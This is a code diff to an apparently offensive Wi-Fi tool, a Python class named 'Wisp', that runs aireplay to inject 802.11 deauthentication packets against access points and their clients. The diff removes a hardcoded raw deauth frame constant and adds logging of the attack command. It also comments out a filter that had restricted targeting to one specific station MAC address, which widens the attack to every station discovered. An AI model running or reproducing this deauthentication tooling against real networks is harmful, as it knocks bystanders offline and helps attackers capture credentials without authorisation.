@@ -124,7 +124,7 @@ class Wisp:
         #     assert not Wisp._call_tool('iw',
         #         'dev', self.dev,
         #         'set', 'freq', self.channel_map[channel])
-        def _dream_process(self, queue, assoc=False, dump=True):
+        def _dream_process(self, queue, assoc=True, dump=True):
             dream_re = re.compile(
                 r'^(\d+),(\d+),([0-9A-Fa-f]{12}),([0-9A-Fa-f]{12}),$')
             cmd = [ tools['dream'] ] \
@@ -237,13 +237,6 @@ class Wisp:
         'avahi-daemon',
     ]
 
-    DEAUTH_REQ = \
-        '\xC0\x00\x3A\x01' \
-        '\xCC\xCC\xCC\xCC\xCC\xCC' \
-        '\xBB\xBB\xBB\xBB\xBB\xBB' \
-        '\xBB\xBB\xBB\xBB\xBB\xBB' \
-        '\x00\x00\x07\x00'
-
     def _deauth(self, channel, bss, sta=None, count=4): 
         #assert 0
         assert self.injector.mon
@@ -260,6 +253,7 @@ class Wisp:
             + [ '-a', sep_mac(bss) ]
             + ([ '-c', sep_mac(sta) ] if sta else [])
             + [ self.injector.mon ]
+        print(' '.join(cmd))
         aireplay = Popen(cmd,
             stdin=DEVNULL,
             stdout=PIPE,
@@ -315,8 +309,8 @@ class Wisp:
                 if bss == sta:
                     continue
                 ###########################
-                if sta != 'f0ee10bf2db0':#'44850074234a':#'f0ee10bf2db0':
-                    continue
+                # if sta != 'f0ee10bf2db0':#'44850074234a':#'f0ee10bf2db0':
+                #     continue
                 ###########################
                 def has_expired(chan, bss, sta):
                     return (chan, bss, sta) not in self.expiries \
